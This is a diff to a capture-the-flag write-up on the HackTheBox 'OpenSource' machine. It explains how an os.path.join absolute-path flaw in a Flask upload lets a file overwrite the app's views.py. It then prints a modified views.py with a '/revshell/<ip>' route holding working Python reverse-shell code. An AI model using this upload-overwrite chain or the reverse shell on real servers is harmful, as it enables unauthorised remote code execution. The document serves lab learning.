@@ -62,44 +62,10 @@ PORT     STATE    SERVICE VERSION
 |_http-server-header: Werkzeug/2.1.2 Python/3.10.3
 3000/tcp filtered ppp
 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
-SF-Port80-TCP:V=7.93%I=7%D=5/26%Time=647109EB%P=x86_64-pc-linux-gnu%r(GetR
-SF:equest,103F,"HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/2\.1\.2\x20P
-SF:ython/3\.10\.3\r\nDate:\x20Fri,\x2026\x20May\x202023\x2019:35:06\x20GMT
-SF:\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x20
-SF:5316\r\nConnection:\x20close\r\n\r\n<html\x20lang=\"en\">\n<head>\n\x20
-SF:\x20\x20\x20<meta\x20charset=\"UTF-8\">\n\x20\x20\x20\x20<meta\x20name=
-SF:\"viewport\"\x20content=\"width=device-width,\x20initial-scale=1\.0\">\
-SF:n\x20\x20\x20\x20<title>upcloud\x20-\x20Upload\x20files\x20for\x20Free!
-SF:</title>\n\n\x20\x20\x20\x20<script\x20src=\"/static/vendor/jquery/jque
-SF:ry-3\.4\.1\.min\.js\"></script>\n\x20\x20\x20\x20<script\x20src=\"/stat
-SF:ic/vendor/popper/popper\.min\.js\"></script>\n\n\x20\x20\x20\x20<script
-SF:\x20src=\"/static/vendor/bootstrap/js/bootstrap\.min\.js\"></script>\n\
-SF:x20\x20\x20\x20<script\x20src=\"/static/js/ie10-viewport-bug-workaround
-SF:\.js\"></script>\n\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20href
-SF:=\"/static/vendor/bootstrap/css/bootstrap\.css\"/>\n\x20\x20\x20\x20<li
-SF:nk\x20rel=\"stylesheet\"\x20href=\"\x20/static/vendor/bootstrap/css/boo
-SF:tstrap-grid\.css\"/>\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20hr
-SF:ef=\"\x20/static/vendor/bootstrap/css/bootstrap-reboot\.css\"/>\n\n\x20
-SF:\x20\x20\x20<link\x20rel=")%r(HTTPOptions,C7,"HTTP/1\.1\x20200\x20OK\r\
-SF:nServer:\x20Werkzeug/2\.1\.2\x20Python/3\.10\.3\r\nDate:\x20Fri,\x2026\
-SF:x20May\x202023\x2019:35:06\x20GMT\r\nContent-Type:\x20text/html;\x20cha
-SF:rset=utf-8\r\nAllow:\x20OPTIONS,\x20HEAD,\x20GET\r\nContent-Length:\x20
-SF:0\r\nConnection:\x20close\r\n\r\n")%r(RTSPRequest,1F4,"<!DOCTYPE\x20HTM
-SF:L\x20PUBLIC\x20\"-//W3C//DTD\x20HTML\x204\.01//EN\"\n\x20\x20\x20\x20\x
-SF:20\x20\x20\x20\"http://www\.w3\.org/TR/html4/strict\.dtd\">\n<html>\n\x
-SF:20\x20\x20\x20<head>\n\x20\x20\x20\x20\x20\x20\x20\x20<meta\x20http-equ
-SF:iv=\"Content-Type\"\x20content=\"text/html;charset=utf-8\">\n\x20\x20\x
-SF:20\x20\x20\x20\x20\x20<title>Error\x20response</title>\n\x20\x20\x20\x2
-SF:0</head>\n\x20\x20\x20\x20<body>\n\x20\x20\x20\x20\x20\x20\x20\x20<h1>E
-SF:rror\x20response</h1>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\x20code
-SF::\x20400</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Message:\x20Bad\x20req
-SF:uest\x20version\x20\('RTSP/1\.0'\)\.</p>\n\x20\x20\x20\x20\x20\x20\x20\
-SF:x20<p>Error\x20code\x20explanation:\x20HTTPStatus\.BAD_REQUEST\x20-\x20
-SF:Bad\x20request\x20syntax\x20or\x20unsupported\x20method\.</p>\n\x20\x20
-SF:\x20\x20</body>\n</html>\n");
+[...]
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
-As we can see, there are 3 ports open: 22, 80 and 3000. 22 and 80 are standard ports for SSH and HTTP, but on port 3000 there is a service running that we don't really know yet. So the natural thing to do now would be to scan the website for hidden directories or subdomains. We know there are no subdomains as the IP address of the machine (10.10.11.164) does not resolve to any domain name, thuss it doesn't have any subdomains. After using gobuster to scan site for hidden directories, it doesn't show anything useful. After playing with the site for a while we are able to download the source code and find a place to upload our files. The source code of views.py looks like this:
+As we can see, there are 3 ports open: 22, 80 and 3000. 22 and 80 are standard ports for SSH and HTTP, but on port 3000 there is a service running that we don't really know yet. So the natural thing to do now would be to scan the website for hidden directories or subdomains. We know there are no subdomains as the IP address of the machine (10.10.11.164) does not resolve to any domain name, thuss it doesn't have any subdomains. After using gobuster to scan site for hidden directories, it doesn't show anything useful. After playing with the site for a while we are able to download the source code and find a place to upload our files. The source code of [views.py](https://github.com/mateusz7988/CTF-Writeups/blob/main/HackTheBox/OpenSource/views.py) looks like this:
 ```python
 import os
 
@@ -135,3 +101,104 @@ def send_report(path):
     path = get_file_name(path)
     return send_file(os.path.join(os.getcwd(), "public", "uploads", path))
 ```
+And the source code of [utils.py](https://github.com/mateusz7988/CTF-Writeups/blob/main/HackTheBox/OpenSource/utils.py) looks like this:
+```python
+import time
+
+
+def current_milli_time():
+    return round(time.time() * 1000)
+
+
+"""
+Pass filename and return a secure version, which can then safely be stored on a regular file system.
+"""
+
+
+def get_file_name(unsafe_filename):
+    return recursive_replace(unsafe_filename, "../", "")
+
+
+"""
+TODO: get unique filename
+"""
+
+
+def get_unique_upload_name(unsafe_filename):
+    spl = unsafe_filename.rsplit("\\.", 1)
+    file_name = spl[0]
+    file_extension = spl[1]
+    return recursive_replace(file_name, "../", "") + "_" + str(current_milli_time()) + "." + file_extension
+
+
+"""
+Recursively replace a pattern in a string
+"""
+
+
+def recursive_replace(search, replace_me, with_me):
+    if replace_me not in search:
+        return search
+    return recursive_replace(search.replace(replace_me, with_me), replace_me, with_me)
+```
+In [utils.py](https://github.com/mateusz7988/CTF-Writeups/blob/main/HackTheBox/OpenSource/utils.py), we can see that function for getting unique filename is not implemented yet. This means, that if we upload something called Test.txt, it will still be called Test.txt. Upon further inspecting of [views.py](https://github.com/mateusz7988/CTF-Writeups/blob/main/HackTheBox/OpenSource/views.py) file, we can see that the function used for crafting the path, where uploaded file should be stored, is using the os.path.join(). It turns out, that os.path.join() has a **FATAL** vulnerability that will come in handy this time!
+It is using our filename for crafting the path to the file, but if the filename starts with "/", it makes the filepath start from the root filesystem:
+```python 
+>>> import os
+>>> os.path.join("test", "file.txt")
+'test/file.txt'
+>>> os.path.join("test","test2","/file.txt")
+'/file.txt'
+```
+It basically means, that if we name our file "/etc/passwd", it wouldn't end up in the "/app/public/uploads/etc/passwd" directory, but would end up overwriting the original "/etc/passwd" file. **Bingo!** 
+
+In source code that we just downloaded we can see that the directory with [views.py](https://github.com/mateusz7988/CTF-Writeups/blob/main/HackTheBox/OpenSource/views.py) is in /app/app/ directory. If we modify [views.py](https://github.com/mateusz7988/CTF-Writeups/blob/main/HackTheBox/OpenSource/views.py), and name it "/app/app/views.py" it would overwrite the original [views.py](https://github.com/mateusz7988/CTF-Writeups/blob/main/HackTheBox/OpenSource/views.py) file and we would be able to execute our own python code. I modified the [views.py](https://github.com/mateusz7988/CTF-Writeups/blob/main/HackTheBox/OpenSource/views.py) file so it contains another route at '/revshell/<ip>' that will execute reverse shell after visiting this endpoint with my browser.
+
+```python
+import os
+
+from app.utils import get_file_name
+from flask import render_template, request, send_file
+
+from app import app
+
+
+@app.route('/')
+def index():
+    return render_template('index.html')
+
+
+@app.route('/download')
+def download():
+    return send_file(os.path.join(os.getcwd(), "app", "static", "source.zip"))
+
+
+@app.route('/upcloud', methods=['GET', 'POST'])
+def upload_file():
+    if request.method == 'POST':
+        f = request.files['file']
+        file_name = get_file_name(f.filename)
+        file_path = os.path.join(os.getcwd(), "public", "uploads", file_name)
+        f.save(file_path)
+        return render_template('success.html', file_url=request.host_url + "uploads/" + file_name)
+    return render_template('upload.html')
+
+
+@app.route('/uploads/<path:path>')
+def send_report(path):
+    path = get_file_name(path)
+    return send_file(os.path.join(os.getcwd(), "public", "uploads", path))
+
+@app.route('/revshell/<ip>')
+def revshell(ip):
+    import socket,subprocess,os
+    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+    s.connect((f"{ip}",1337));os.dup2(s.fileno(),0)
+    os.dup2(s.fileno(),1);os.dup2(s.fileno(),2)
+    import pty
+    pty.spawn("sh")
+```
+    
+ 
+    
+
